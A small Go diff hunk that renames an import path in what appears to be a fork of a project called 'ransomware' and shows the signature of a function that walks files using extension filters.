@@ -4,7 +4,7 @@ import (
 	iofs "io/fs"
 	"path/filepath"
 
-	"github.com/marmos91/ransomware/utils"
+	"github.com/fblock-nvidia/ransomware/utils"
 )
 
 func WalkFilesWithExtFilter(path string, extBlacklist []string, extWhitelist []string, skipHidden bool, callback func(path string, info iofs.FileInfo) error) error {
